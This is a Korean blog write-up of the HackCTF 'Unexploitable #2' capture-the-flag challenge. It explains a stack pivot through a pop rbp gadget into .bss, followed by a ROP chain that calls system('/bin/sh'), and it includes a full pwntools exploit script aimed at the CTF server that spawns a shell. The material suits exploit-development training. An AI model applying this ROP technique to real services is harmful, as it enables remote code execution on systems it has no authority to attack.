---
layout: post
title:  "HacCTF Unexploitable #2 write-up"
date:   2020-03-17 19:45:55
image:  hackctf_unex2.PNG
tags:   [HackCTF]
categories: [Write-up]
---

# [HackCTF] Unexploitable #2

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled.png)

NX 비트가 걸려있다.


**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled%201.png)

바이너리를 실행시켜보면 fflush가 없다! 라는 의미의 문자열이 출력되고 입력을 한번 받는다. 그리고 바로 종료가 된다


**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled%202.png)

메인을 보면 매우 간단하다. 저번 " Unexploitable #2 " 문제와 매우 유사한데, 차이점은 fflush함수가 없다는 것이다. 저번 문제에서는 .Load 영역에 존재하는 fflush 문자열을 이용하여 간편하게 풀수가 있었다.

하지만 이번에는 fflush가 없으므로 다른 방법으로 풀어야 한다. 또한 gift 함수가 마찬가지로 존재한다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled%203.png)



### 2. 접근방법

---

저번에 3가지의 방법으로 문제를 풀었었다. 이 중 한가지를 이용하여 문제를 해결하면 된다.

우선, pop rbp; ret 가젯이 존재한다면, rbp값을 변조하여 fget의 버퍼 주소를 바꿔치기 가능하다. 

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled%204.png)

rbp-0x10 영역에 입력한 데이터를 저장하므로, 우리는 .bss 영역의 주소를 구한뒤, + 0x10을 하여 rbp값을 저장시키면 된다. 그다음 메인으로 다시 돌아가 gitf함수의 system 함수를 이용하면 된다.

여기서 그냥 바로 gift함수로 가면 rdi에 이상한 값이 들어가게 되므로 rdi값을 저장하는 라인 이후를 ret에 넣어야 한다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%202/Untitled%205.png)

따라서 0x40067A 로 돌아가게 하면 된다.

정리를 해보면 다음의 시나리오를 통해 익스를 하면 된다.


- **시나리오**
    1. **ret를 pop rbp;ret 로 하여 fgets의 데이터 저장 변수를 바꿔치기 한다.**

        payload = ret(pop rbp;ret 주소) + (.bss주소+0x10) + (main+99 부분)

        sendline(payload)

    2.  **.bss영역에 /bin/sh를 저장한뒤 system함수 호출하기**
        - /bin/sh를 보내면 .bss 영역에 저장되는데 해당 영역 +0x10가 다음 ret위치이다.
        - 따라서 /bin/sh + 0x10에 pop rdi;ret 주소를 넣는다
        - 그다음 rdi에 .bss 주소가 들어가야 하므로 해당 bss 주소를 이어서 붙힌다
        - 그다음 ret를 gitf + 9 위치로 가게끔 한다

        payload =  "/bin/sh\x00" + 더미*0x10 + pop rdi;ret 주소 + .bss주소(rdi에 저장될) + (gift+9 ⇒ ret될 주소임)




### 3. 풀이

---

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz",3029)
    #p=process("./Unexploitable_2")
    #gdb.attach(p)
    
    pr=0x4005e0 # pop rbp;ret;
    prdi=0x400773 # pop rdi;ret;
    bss=0x601050+0x900
    main_99=0x4006EE
    p.recvuntil("\n")
    
    payload="A"*0x18
    payload+=p64(pr)
    payload+=p64(bss+0x10)
    payload+=p64(main_99)
    
    p.sendline(payload)
    payload2="/bin/sh\x00"
    payload2+="B"*0x10
    payload2+=p64(prdi)
    payload2+=p64(bss)
    payload2+=p64(0x40067F) #gift+9
    pause()
    p.sendline(payload2)
    p.interactive()



### 4. 몰랐던 개념

---

none